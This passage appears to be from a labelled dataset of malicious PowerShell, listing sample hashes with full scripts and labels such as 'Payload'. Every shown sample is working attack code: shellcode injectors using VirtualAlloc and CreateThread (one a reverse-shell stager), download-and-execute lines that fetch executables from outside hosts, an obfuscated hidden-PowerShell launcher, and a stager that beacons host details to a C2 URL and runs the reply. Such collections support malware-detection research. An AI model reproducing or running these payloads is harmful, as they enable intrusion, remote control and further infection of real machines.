    $EndTime = (Get-Date).addseconds(90)

    
    do {
       $WscriptObject = New-Object -com wscript.shell
       $WscriptObject.SendKeys([char]175)
    }
    until ((Get-Date) -gt $EndTime)
}",Payload
f11afcf7e0f15df1ba9971043dcdfa36443d1d3383e90d26b75da51112081c36,"
$PxP = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $PxP -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xd7,0xd9,0x74,0x24,0xf4,0xbf,0x2a,0x05,0xce,0x84,0x5e,0x29,0xc9,0xb1,0x57,0x31,0x7e,0x17,0x83,0xee,0xfc,0x03,0x54,0x16,0x2c,0x71,0x54,0xf0,0x32,0x7a,0xa4,0x01,0x53,0xf2,0x41,0x30,0x53,0x60,0x02,0x63,0x63,0xe2,0x46,0x88,0x08,0xa6,0x72,0x1b,0x7c,0x6f,0x75,0xac,0xcb,0x49,0xb8,0x2d,0x67,0xa9,0xdb,0xad,0x7a,0xfe,0x3b,0x8f,0xb4,0xf3,0x3a,0xc8,0xa9,0xfe,0x6e,0x81,0xa6,0xad,0x9e,0xa6,0xf3,0x6d,0x15,0xf4,0x12,0xf6,0xca,0x4d,0x14,0xd7,0x5d,0xc5,0x4f,0xf7,0x5c,0x0a,0xe4,0xbe,0x46,0x4f,0xc1,0x09,0xfd,0xbb,0xbd,0x8b,0xd7,0xf5,0x3e,0x27,0x16,0x3a,0xcd,0x39,0x5f,0xfd,0x2e,0x4c,0xa9,0xfd,0xd3,0x57,0x6e,0x7f,0x08,0xdd,0x74,0x27,0xdb,0x45,0x50,0xd9,0x08,0x13,0x13,0xd5,0xe5,0x57,0x7b,0xfa,0xf8,0xb4,0xf0,0x06,0x70,0x3b,0xd6,0x8e,0xc2,0x18,0xf2,0xcb,0x91,0x01,0xa3,0xb1,0x74,0x3d,0xb3,0x19,0x28,0x9b,0xb8,0xb4,0x3d,0x96,0xe3,0xd0,0xaf,0xcc,0x6f,0x21,0x58,0x78,0xe6,0x4f,0xf1,0xd2,0x90,0xc3,0x76,0xfd,0x67,0x23,0xad,0x30,0xbc,0x88,0x1d,0x60,0x11,0x7c,0xca,0xbc,0xc3,0xfb,0xad,0x3e,0x3e,0xa8,0xe2,0xaa,0xc3,0x1c,0x56,0x43,0x78,0xa3,0x58,0x93,0x96,0x28,0x58,0x93,0x66,0x1e,0x61,0xd1,0x27,0x2a,0xc6,0xd5,0xf7,0xc2,0xbf,0x5c,0x68,0xd4,0xbf,0x8a,0x1f,0x1f,0x6c,0x5d,0x1f,0x92,0x73,0x19,0x4c,0x81,0x20,0x75,0x21,0x73,0xaf,0x92,0x90,0x55,0x14,0x9a,0xcf,0x3c,0x00,0x6e,0xb0,0x28,0x55,0x5d,0x4e,0xa9,0xdc,0x42,0x24,0xad,0x8e,0xe8,0xa7,0xfb,0x46,0x98,0x91,0x9d,0x11,0x9d,0xc8,0xf1,0x4e,0x31,0xa1,0xa3,0x18,0x98,0x43,0x54,0xa2,0x1d,0x9e,0xe1,0x94,0x97,0x2a,0xa5,0x61,0x81,0x42,0xc9,0x3f,0x93,0xc4,0xd6,0x95,0xbe,0xa8,0x40,0x16,0x2f,0x28,0x91,0x7e,0x4f,0x28,0xd1,0x7e,0x1c,0x40,0x89,0xda,0xf1,0x75,0xd6,0xf6,0x65,0x26,0x7a,0x70,0x6e,0x9f,0x14,0x82,0x51,0x1f,0xe5,0xd1,0xc7,0x77,0xf7,0x43,0x6e,0x65,0x08,0xbe,0xf4,0xa9,0x83,0x8c,0x7c,0x2e,0x6d,0xcc,0x06,0xf0,0x18,0x37,0x50,0x33,0xbd,0x5f,0x14,0x4c,0xbd,0x5f,0xef,0x84,0x6c,0x98,0x21,0xc6,0x41,0xeb,0x6f,0x27,0x9b,0x3f,0x70;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$RjZG=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($RjZG.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$RjZG,0,0,0);for (;;){Start-sleep 60};

",Payload
65f22cf08680397463d0ef427805af1cc5574fb802060c0225406c352295f7cc,"
$JMX3 = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $JMX3 -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x98,0x3e,0xbb,0xd6,0xda,0xcb,0xd9,0x74,0x24,0xf4,0x5b,0x31,0xc9,0xb1,0x55,0x31,0x53,0x13,0x83,0xc3,0x04,0x03,0x53,0x97,0xdc,0x4e,0x2a,0x4f,0xa2,0xb1,0xd3,0x8f,0xc3,0x38,0x36,0xbe,0xc3,0x5f,0x32,0x90,0xf3,0x14,0x16,0x1c,0x7f,0x78,0x83,0x97,0x0d,0x55,0xa4,0x10,0xbb,0x83,0x8b,0xa1,0x90,0xf0,0x8a,0x21,0xeb,0x24,0x6d,0x18,0x24,0x39,0x6c,0x5d,0x59,0xb0,0x3c,0x36,0x15,0x67,0xd1,0x33,0x63,0xb4,0x5a,0x0f,0x65,0xbc,0xbf,0xc7,0x84,0xed,0x11,0x5c,0xdf,0x2d,0x93,0xb1,0x6b,0x64,0x8b,0xd6,0x56,0x3e,0x20,0x2c,0x2c,0xc1,0xe0,0x7d,0xcd,0x6e,0xcd,0xb2,0x3c,0x6e,0x09,0x74,0xdf,0x05,0x63,0x87,0x62,0x1e,0xb0,0xfa,0xb8,0xab,0x23,0x5c,0x4a,0x0b,0x88,0x5d,0x9f,0xca,0x5b,0x51,0x54,0x98,0x04,0x75,0x6b,0x4d,0x3f,0x81,0xe0,0x70,0x90,0x00,0xb2,0x56,0x34,0x49,0x60,0xf6,0x6d,0x37,0xc7,0x07,0x6d,0x98,0xb8,0xad,0xe5,0x34,0xac,0xdf,0xa7,0x50,0x5c,0x85,0x23,0xa0,0xc8,0x32,0xa5,0xce,0x61,0xe9,0x5d,0x42,0x05,0x37,0x99,0xa5,0x3c,0x06,0x7e,0x0a,0xec,0x3a,0xd3,0xff,0x7a,0x87,0x85,0x86,0xdd,0x08,0xfc,0x2b,0x71,0x9d,0xfc,0x98,0x26,0x09,0x93,0x01,0xc9,0xc9,0x7b,0x45,0xc9,0xc9,0x7b,0x9a,0xf0,0x80,0x28,0xb0,0x31,0x13,0x9f,0x50,0x61,0x9a,0x80,0x66,0x72,0x49,0x37,0xa0,0xde,0x1a,0x48,0x2e,0x81,0x5e,0x1b,0x7d,0x12,0x08,0xcf,0xd7,0xfc,0x5d,0xba,0xf9,0xc7,0x5e,0x90,0x93,0x52,0xab,0x44,0xc8,0xf1,0xf8,0x29,0xb8,0x9d,0xd3,0xcb,0x5c,0x25,0xd3,0x01,0xd9,0x19,0x5e,0xa0,0xae,0xec,0x4c,0xdc,0xc0,0xba,0x2d,0x4b,0xdf,0x10,0x5b,0x34,0x77,0x9b,0x8c,0xb4,0x87,0xf3,0xac,0xb4,0xc7,0x03,0xfe,0xdc,0x9f,0xa7,0x53,0xf8,0xe0,0x7d,0xc0,0x51,0x4d,0xf7,0x00,0x02,0x19,0x07,0xef,0xad,0xd9,0x54,0xb9,0xc5,0xcb,0xcc,0xcc,0xf4,0x14,0x25,0x4b,0x38,0x9e,0x0b,0xdf,0xbe,0x5f,0x57,0x65,0x00,0x2a,0xb2,0x3e,0x42,0x8b,0xd4,0x36,0xbb,0xcc,0xda,0x31,0x2d,0x51,0x10,0xa6,0xc4,0xe3,0x36,0x43,0x7d,0x65,0xa0,0xb8,0xee,0x01,0x58,0x91,0x9f,0x9f,0xcd,0x82,0x31,0x71,0x7a,0x32,0xce;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$xUws=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($xUws.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$xUws,0,0,0);for (;;){Start-sleep 60};

",Payload
790824bddffe80e41cc5596dd893685b3f24fc69a5bd3be442c28e183050d421,"
$dTmD = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $dTmD -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xc4,0xbb,0xed,0xad,0x50,0x81,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x47,0x83,0xc0,0x04,0x31,0x58,0x14,0x03,0x58,0xf9,0x4f,0xa5,0x7d,0xe9,0x12,0x46,0x7e,0xe9,0x72,0xce,0x9b,0xd8,0xb2,0xb4,0xe8,0x4a,0x03,0xbe,0xbd,0x66,0xe8,0x92,0x55,0xfd,0x9c,0x3a,0x59,0xb6,0x2b,0x1d,0x54,0x47,0x07,0x5d,0xf7,0xcb,0x5a,0xb2,0xd7,0xf2,0x94,0xc7,0x16,0x33,0xc8,0x2a,0x4a,0xec,0x86,0x99,0x7b,0x99,0xd3,0x21,0xf7,0xd1,0xf2,0x21,0xe4,0xa1,0xf5,0x00,0xbb,0xba,0xaf,0x82,0x3d,0x6f,0xc4,0x8a,0x25,0x6c,0xe1,0x45,0xdd,0x46,0x9d,0x57,0x37,0x97,0x5e,0xfb,0x76,0x18,0xad,0x05,0xbe,0x9e,0x4e,0x70,0xb6,0xdd,0xf3,0x83,0x0d,0x9c,0x2f,0x01,0x96,0x06,0xbb,0xb1,0x72,0xb7,0x68,0x27,0xf0,0xbb,0xc5,0x23,0x5e,0xdf,0xd8,0xe0,0xd4,0xdb,0x51,0x07,0x3b,0x6a,0x21,0x2c,0x9f,0x37,0xf1,0x4d,0x86,0x9d,0x54,0x71,0xd8,0x7e,0x08,0xd7,0x92,0x92,0x5d,0x6a,0xf9,0xfa,0x92,0x47,0x02,0xfa,0xbc,0xd0,0x71,0xc8,0x63,0x4b,0x1e,0x60,0xeb,0x55,0xd9,0x87,0xc6,0x22,0x75,0x76,0xe9,0x52,0x5f,0xbc,0xbd,0x02,0xf7,0x15,0xbe,0xc8,0x07,0x9a,0x6b,0x64,0x0d,0x0c,0x54,0xd1,0x05,0xa9,0x3c,0x20,0x16,0x30,0x06,0xad,0xf0,0x62,0x28,0xfe,0xac,0xc2,0x98,0xbe,0x1c,0xaa,0xf2,0x30,0x42,0xca,0xfc,0x9a,0xeb,0x60,0x13,0x73,0x43,0x1c,0x8a,0xde,0x1f,0xbd,0x53,0xf5,0x65,0xfd,0xd8,0xfa,0x9a,0xb3,0x28,0x76,0x89,0x23,0xd9,0xcd,0xf3,0xe5,0xe6,0xfb,0x9e,0x09,0x73,0x00,0x09,0x5e,0xeb,0x0a,0x6c,0xa8,0xb4,0xf5,0x5b,0xa3,0x7d,0x60,0x24,0xdb,0x81,0x64,0xa4,0x1b,0xd4,0xee,0xa4,0x73,0x80,0x4a,0xf7,0x66,0xcf,0x46,0x6b,0x3b,0x5a,0x69,0xda,0xe8,0xcd,0x01,0xe0,0xd7,0x3a,0x8e,0x1b,0x32,0xbb,0xf2,0xcd,0x7a,0xc9,0x1a,0xce;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$BVEI=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($BVEI.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$BVEI,0,0,0);for (;;){Start-sleep 60};

",Payload
5cf958029b944f22843aede7e4bb4a478b29caf882742e3af78dfe197faf6f55,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0xbd,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
915021696e49f7e60a213f3d54a562dc226545642ba2862323880ab6eeae9e68,"
(New-Object System.Net.WebClient).DownloadFile('http://andersonken4791.pserver.ru/doc.exe','fleeble.exe');Start-Process 'fleeble.exe'

",Payload
30a8242566a8984c5d696f84b7a32f0806dae3ad9464d5c5866c811c67515da8,"
$wc=NEW-OBject SySTem.NET.WEbCLieNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEadErS.AdD('User-Agent',$u);$wC.PRoxY = [SysTem.Net.WeBREQuesT]::DEFAuLTWEbPROxY;$WC.PROxy.CREdeNtIALS = [SYsteM.NET.CREDentIaLCAcHE]::DeFauLTNEtwOrkCrEdenTIalS;$K='c433c996947013571747a53c806e586d';$i=0;[chAr[]]$b=([cHar[]]($WC.DOWnLOadStriNG(""http://192.168.1.18:8080/index.asp"")))|%{$_-BXor$k[$I++%$K.LengtH]};IEX ($B-JOIn'')

",Payload
b37ab3265996436e757c888bb69929c8c93a26f3da4dec27c33716db27750f9d,"
if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAAsjWFgCA7VWbW/aSBD+nEr9D1aFZFslGAhNmkiVbm3zlgABHEyAQ9XGXpuFtZfaa956/e83BtzSNrnrVToL5N2d2d2ZZ56ZsZeEjqA8lPjHS7dS3kmfX7866+IIB5KSo6W55ybDvJRbbdxrP7yqq2dnIM+tqGhJHyRlgpZLkweYhtObGyOJIhKKw7xQJwLFMQmeGCWxokp/ScMZicj5/dOcOEL6LOU+FuqMP2F2VNsa2JkR6RyFbiprcQenhhWsJaNCkf/8U1Yn56VpofopwSxWZGsbCxIUXMZkVfqiphc+bJdEkdvUiXjMPVEY0vCiXBiEMfZIB05bkTYRM+7GsgpewC8iIolCae9PesBBrMgw7EbcQa4bkRi0C81wxRdEyYUJY3npD2VyvL2fhIIGBOSCRHxpkWhFHRIXGjh0GekTb6p0yDpz+lc3KaebQKsrIjUP8XjGzDZ3E0YOO2X1Z0OzGKrwnMYRAPjy+tXrV97X+M+dj/w0+jA6m+zHBMxUujyme8UPUjEvteFCLHi0hWnuIUqIOpUmKfyT6VTKRa1L47a3zb98RCnTB+0nt/UeliY2p+4UthxjkyOrVmjol09huZ+KX6aaSTwaEnMb4oA6GZuU54AnHiN7dwuZWgdsU+SjgLgmYcTHIoUyL01+3lYNqPi6V08oc0mEHAheDFZBXNXvjTlER5GbYZsEgNZhLkMgPOAwybSPvN1mt6dzUJINhuM4L3UTSCInL1kEM+LmJRTG9ChCieD7ofzN3HbCBHVwLLLjpuoPcB6vNXgYiyhxII4AwYO1JA7FLEUkLzWoS/StRf3sevlZPAzMGA19OGkF8YCVFAdLpOyIwNKMCWrBIqIZLBkJQG2f1zWGfcjiYy7sGYV94sov2JpR/sDvFJwMlRNLIeIW4yIv2TQSUCVSoFN2/bYhJyXi1CQjIscoKVkeTfStSMmfo7V1wDvX5s7bk/oI2R6gSAA4tYgHOo7JZcUSEUCnvNHuqYHgGTVD1nb0BS2hNS012/Af0IsmN6/cu9t5Q4vMzcxDzbjZbnTNXqNRWd1adkVY1aa46zZFu/o4n1uo0R+MxLiJGg+0uBhVdstburNayB1ttMudvlsX9c1u7rveyPQ8/8qz+qV3NdoaGj29WMYts5q0hvpaL1biKl03enTQW9zWxNPIZnjgaf5j6RrTTSua2yXe3jURqs8unN2tZ9dnbXc7amjXw8oCVREywqpd0/ndSI9QV7Oxb3OU3C06gQ++YoOScW9Q03u9mo4G9fkn81rzYe8jnulDu0zHy8f+DOY1MOFOK1aaLtnxUQ9AqnOE/T7o+EbZmXmgY75F+tsOj8t4oXOkg05t/AnsGi1rXQbyh0GZI5t1HjFqjbc1TSuNuhXUKNJh3UfpkdjXexjFK3NnaiXb5e7wXWfkafYju9JM42HpeJqmrRvmnTMubd7fX71vDakdcDTQNPtNyhKgSY5dX+CTeL9U4ts4imeYAQ+gdmf5WeNR7ViGu5ymOxQla8cLEoWEQReDPpfRGjHGnbQhHGo2dKNDj5hCig5geFF+dqRKXxXVb50iW7q5GYOlkCknBC60SOiLWb64uSgWoeoXN5UiOPzrThp8uVVOT8ynzWMP1g83sf1NappKOez4OOj+72ges3gGL/df0fy29g/SX0K4mD/4/9Py9wv/CeffcX+IqQBlC2oQI4c++QIKR/qcfF0cIgS88I5P+n13n4jzDnx2/A2/DPsrUwoAAA==''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

",Payload
bccd308c1363e2e108f38e9cd763bbe80cb5464d1c094981de1b335b747d0f5e,"
(New-Object System.Net.WebClient).DownloadFile('http://www.athensheartcenter.com/crm/cgi-bin/lnm.exe',""$env:TEMP\\lnm.exe"");Start-Process (""$env:TEMP\\lnm.exe"")

",Payload
a1ceff7212154f53276e62b0b340f817851c2480ec7497b544ef3f315bb71992,"
$FrO7 = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $FrO7 -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xc3,0xd9,0x74,0x24,0xf4,0x5a,0xbe,0x09,0x93,0xda,0xf4,0x2b,0xc9,0xb1,0x59,0x31,0x72,0x17,0x03,0x72,0x17,0x83,0xcb,0x97,0x38,0x01,0x37,0x7f,0x3e,0xea,0xc7,0x80,0x5f,0x62,0x22,0xb1,0x5f,0x10,0x27,0xe2,0x6f,0x52,0x65,0x0f,0x1b,0x36,0x9d,0x84,0x69,0x9f,0x92,0x2d,0xc7,0xf9,0x9d,0xae,0x74,0x39,0xbc,0x2c,0x87,0x6e,0x1e,0x0c,0x48,0x63,0x5f,0x49,0xb5,0x8e,0x0d,0x02,0xb1,0x3d,0xa1,0x27,0x8f,0xfd,0x4a,0x7b,0x01,0x86,0xaf,0xcc,0x20,0xa7,0x7e,0x46,0x7b,0x67,0x81,0x8b,0xf7,0x2e,0x99,0xc8,0x32,0xf8,0x12,0x3a,0xc8,0xfb,0xf2,0x72,0x31,0x57,0x3b,0xbb,0xc0,0xa9,0x7c,0x7c,0x3b,0xdc,0x74,0x7e,0xc6,0xe7,0x43,0xfc,0x1c,0x6d,0x57,0xa6,0xd7,0xd5,0xb3,0x56,0x3b,0x83,0x30,0x54,0xf0,0xc7,0x1e,0x79,0x07,0x0b,0x15,0x85,0x8c,0xaa,0xf9,0x0f,0xd6,0x88,0xdd,0x54,0x8c,0xb1,0x44,0x31,0x63,0xcd,0x96,0x9a,0xdc,0x6b,0xdd,0x37,0x08,0x06,0xbc,0x5f,0xa0,0x7c,0x4a,0xa0,0x54,0x08,0xdb,0xce,0xcd,0xa2,0x73,0x43,0x79,0x6d,0x84,0xa4,0x50,0x40,0x51,0x09,0x08,0xf0,0x36,0xfd,0xc6,0xcc,0xee,0x78,0xb0,0xce,0xdb,0x28,0xed,0x5a,0xe0,0x9d,0x42,0xf3,0xba,0x30,0x65,0x03,0xaa,0xbf,0x65,0x03,0x2a,0xef,0x27,0x59,0x6c,0xac,0x90,0x5d,0x20,0x5a,0x88,0xd4,0x5f,0x5c,0xc9,0x32,0xd6,0xa7,0x65,0xd5,0xe8,0x15,0x6a,0xa1,0xbb,0x0a,0x39,0xfd,0x68,0xfb,0xd5,0xea,0xdb,0x2d,0x1d,0x12,0x36,0xa7,0x0b,0xe6,0xe7,0xa0,0x4b,0xc5,0x17,0x31,0xc5,0xca,0x7d,0x35,0x85,0x60,0x9e,0x63,0x4d,0x00,0xe6,0x15,0x0b,0x15,0x33,0x7a,0x47,0xb9,0xe8,0x2b,0x0f,0x10,0x08,0xcc,0xb4,0x95,0xc1,0x69,0x8a,0x1f,0xe3,0x3e,0x7e,0x39,0x9b,0x30,0x35,0x1b,0x0d,0x4e,0xe3,0x36,0xf1,0xd8,0x0c,0xd7,0xf1,0x18,0x65,0xd7,0xf1,0x58,0x75,0x84,0x99,0x00,0xd1,0x79,0xbc,0x4e,0xcc,0xed,0x6d,0xe2,0x66,0xf6,0xc6,0x6c,0x79,0xd9,0xe8,0x6c,0x2a,0x4f,0x80,0x7e,0x5a,0xe6,0xb2,0x80,0xb7,0x7c,0xf2,0x0b,0xf5,0xf4,0xf5,0xf2,0xc6,0x8e,0x39,0x81,0x2d,0xc8,0x7a,0x35,0x46,0x9c,0x83,0x35,0x69,0x2c,0x0b,0xa3,0xf8,0xa7,0x84,0x5c,0x69,0x25,0x33,0xc7,0x5f,0xd1,0xa7,0x69,0xd3,0x37,0x49,0x13,0x67,0x48;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Y4g3=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Y4g3.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Y4g3,0,0,0);for (;;){Start-sleep 60};

",Payload
3c87f33d5e61df0c265144748a15a73effc951d62def214a617d304d9f4d6d2d,"
(New-Object System.Net.WebClient).DownloadFile('http://www.wealthandhealthops.com/modules/mod_easybloglist/kntgszu.exe',""$env:TEMP\\kntgszu.exe"");Start-Process (""$env:TEMP\\kntgszu.exe"")

",Payload
0a13ad1f5355f4a0e55cf268538e432869c5a6759f0cc197a71f26d56704db12,"
(New-Object System.Net.WebClient).DownloadFile('http://ddl7.data.hu/get/0/9552103/PFIfdp.exe','fleeble.exe');Start-Process 'fleeble.exe'

",Payload
9e012f9dff132e8146489274a8220acd799abb122b0a51756a4bd6496a762e04,"
$sha1 = New-Object System.Security.Cryptography.SHA1CryptoServiceProvider; $vc=$env:computername; $vu=$env:username; $vh=[system.convert]::tobase64string($sha1.ComputeHash([system.text.encoding]::utf8.getbytes($vc+$vu+$(gwmi win32_bios)))); $vs=[system.convert]::tobase64string([system.text.encoding]::utf8.getbytes($vc+'|'+$vu+'|'+'903f2f8cf535578b8c63dfcf5f1d3f549e489101')); $u='http://vanity-fair.org/news/rss.php?q='+$vs; $ps=(New-Object Net.WebClient).DownloadString($u); $ps=[Convert]::FromBase64String($ps); $n=$ps[0]; $k=$ps[1..$n]; $d=$ps[($n+1)..$ps.count]; for ($i=0; $i -lt $d.count -and $i -lt 1024; $i++){ $d[$i] = $d[$i] -bxor $k[$i % $n]; }; iex $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$d)), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd()

",TaskExecution
617d5981e04913525fe4f2d30e6dcec143cb53ac5f07fcec99e27ae21295f951,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x